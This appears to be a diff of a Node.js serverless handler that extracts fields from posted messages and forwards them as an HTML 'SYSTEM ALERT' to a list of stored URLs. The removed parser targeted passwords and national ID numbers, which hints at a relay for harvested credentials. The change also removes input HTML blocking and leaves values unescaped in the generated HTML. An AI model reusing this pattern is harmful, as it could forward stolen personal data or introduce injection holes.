@@ -34,42 +34,45 @@ function parseBody(req) {
 }
 
 // ======================
-// DETECT HTML (BLOCK TOTAL)
-// ======================
-function isHtml(input = "") {
-  return /<[^>]+>/.test(input);
-}
-
-// ======================
-// STRICT KEY:VALUE PARSER
-// ======================
-function extractVars(input = "") {
-  const text = String(input);
-
-  const get = (key) => {
-    const match = text.match(new RegExp(`${key}\\s*[:=]\\s*([^\\n]+)`, "i"));
-    return match ? match[1].trim() : "";
-  };
-
-  return {
-    user: get("user"),
-    email: get("email"),
-    phone: get("phone"),
-    ip: get("ip"),
-    device: get("device"),
-    nik: get("nik"),
-    password: get("password")
-  };
-}
-
-// ======================
-// STRIP SAFE TEXT
+// CLEAN TEXT
 // ======================
 function clean(str = "") {
   return String(str)
-    .replace(/<[^>]*>/g, "") // remove html
-    .replace(/\$/g, "")      // remove $
+    .replace(/<[^>]*>/g, "")
     .trim();
+}
+
+// ======================
+// AUTO EXTRACT ALL VARS FROM HTML / TEXT
+// ======================
+function extractAllVars(input = "") {
+  const text = String(input)
+    .replace(/<script[\s\S]*?<\/script>/gi, "")
+    .replace(/<style[\s\S]*?<\/style>/gi, "")
+    .replace(/<[^>]*>/g, "\n");
+
+  const vars = {};
+
+  // key: value / key = value
+  const regex = /([a-zA-Z0-9_]+)\s*[:=]\s*([^\n]+)/g;
+  let m;
+
+  while ((m = regex.exec(text)) !== null) {
+    const key = m[1].toLowerCase().trim();
+    const value = m[2].trim();
+    vars[key] = value;
+  }
+
+  // table detection <td>key</td><td>value</td>
+  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
+
+  while ((m = tdRegex.exec(input)) !== null) {
+    const key = m[1].replace(/<[^>]*>/g, "").toLowerCase().trim();
+    const value = m[2].replace(/<[^>]*>/g, "").trim();
+    if (key) vars[key] = value;
+  }
+
+  return vars;
 }
 
 // ======================
@@ -79,20 +82,20 @@ function buildHtml(vars) {
   return `
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-</head>
+<head><meta charset="UTF-8"></head>
 <body style="font-family:Arial;background:#0f172a;color:#fff;padding:20px">
 
 <h2 style="color:#38bdf8">🚨 SYSTEM ALERT</h2>
 
 <table style="width:100%;background:#1e293b;padding:15px;border-radius:10px">
+
 <tr><td><b>User</b></td><td>${vars.user || "-"}</td></tr>
 <tr><td><b>Email</b></td><td>${vars.email || "-"}</td></tr>
 <tr><td><b>Phone</b></td><td>${vars.phone || "-"}</td></tr>
-<tr><td><b>IP</b></td><td>${vars.ip}</td></tr>
+<tr><td><b>IP</b></td><td>${vars.ip || "-"}</td></tr>
 <tr><td><b>Device</b></td><td>${vars.device || "-"}</td></tr>
-<tr><td><b>Time</b></td><td>${vars.time}</td></tr>
+<tr><td><b>Time</b></td><td>${vars.time || "-"}</td></tr>
+
 </table>
 
 </body>
@@ -106,10 +109,7 @@ function buildHtml(vars) {
 module.exports = async (req, res) => {
   try {
     if (req.method !== "POST") {
-      return res.status(405).json({
-        success: false,
-        message: "POST only"
-      });
+      return res.status(405).json({ success: false, message: "POST only" });
     }
 
     const body = parseBody(req);
@@ -118,7 +118,7 @@ module.exports = async (req, res) => {
     const action = body.action || "send";
 
     // ======================
-    // URL MANAGEMENT
+    // URL MANAGER
     // ======================
     if (action === "add-url") {
       if (!body.url) return res.json({ success: false, message: "URL kosong" });
@@ -144,21 +144,9 @@ module.exports = async (req, res) => {
     // ======================
     // INPUT
     // ======================
-    const subjekRaw = body.subjek || "";
-    const messageRaw = body.message || body.pesan || "";
+    const subjek = clean(body.subjek || "");
     const sender = clean(body.sender || "system");
-
-    // ======================
-    // BLOCK HTML INPUT (FIX UTAMA)
-    // ======================
-    if (isHtml(messageRaw) || isHtml(subjekRaw)) {
-      return res.status(400).json({
-        success: false,
-        message: "HTML tidak diizinkan, gunakan format key:value saja"
-      });
-    }
-
-    const subjek = clean(subjekRaw);
+    const messageRaw = body.message || body.pesan || "";
 
     if (!subjek || !messageRaw) {
       return res.status(400).json({
@@ -168,13 +156,11 @@ module.exports = async (req, res) => {
     }
 
     // ======================
-    // EXTRACT VARIABLES
+    // AUTO EXTRACT VARIABLES
     // ======================
-    const vars = extractVars(messageRaw);
+    const vars = extractAllVars(messageRaw);
 
     vars.time = new Date().toISOString();
-
-    // fallback IP
     vars.ip =
       vars.ip ||
       req.headers["x-forwarded-for"] ||
@@ -200,9 +186,7 @@ module.exports = async (req, res) => {
       try {
         const r = await fetchFn(url, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
           body: payload
         });
 
